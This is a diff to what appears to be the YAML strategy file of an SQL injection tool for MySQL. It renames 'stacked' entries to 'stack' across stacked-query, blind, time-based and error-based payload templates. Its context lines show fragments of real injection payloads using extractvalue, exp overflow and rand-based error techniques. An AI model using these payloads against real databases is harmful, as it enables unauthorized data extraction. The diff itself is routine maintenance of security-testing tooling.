@@ -262,7 +262,7 @@ strategy:
    )
   orderBy: order by 1337
 
- stacked: ; select ${window}
+ stack: ; select ${window}
 
  binary:
   test:
@@ -277,7 +277,7 @@ strategy:
     %26${bit}
   modeAnd: and
   modeOr: or
-  modeStacked: ; select 1 where
+  modeStack: ; select 1 where
   blind: ${binary.mode} ${test}
   time: |
    ${binary.mode} if(
@@ -359,7 +359,7 @@ strategy:
       ) or '
      capacity: 453
 
-   - name: Unsigned:stacked
+   - name: Unsigned:stack
      query: |
       ; select !(
           select *
@@ -436,7 +436,7 @@ strategy:
       ) or '
      capacity: 462
 
-   - name: OverDouble:stacked
+   - name: OverDouble:stack
      query: |
       ; select exp(
           ~(
@@ -535,7 +535,7 @@ strategy:
       ) or '
      capacity: 64
 
-   - name: Rand:stacked
+   - name: Rand:stack
      query: |
       ; select 1 from (
           select
@@ -553,7 +553,7 @@ strategy:
 
    - name: Extractvalue
      query: |
-      /* XPATH syntax error: '<sqli>', whatever mode OR AND stacked */
+      /* XPATH syntax error: '<sqli>', whatever mode OR AND STACK */
       or 1 = extractvalue(
           0x0a,
           concat(
@@ -595,7 +595,7 @@ strategy:
       ) or '
      capacity: 31
 
-   - name: Extractvalue:stacked
+   - name: Extractvalue:stack
      query: |
       ; select extractvalue(
           0x0a,
@@ -684,7 +684,7 @@ strategy:
       ) or '
      capacity: 460
 
-   - name: OverInt:stacked
+   - name: OverInt:stack
      query: |
       ; select 2*if(
           (
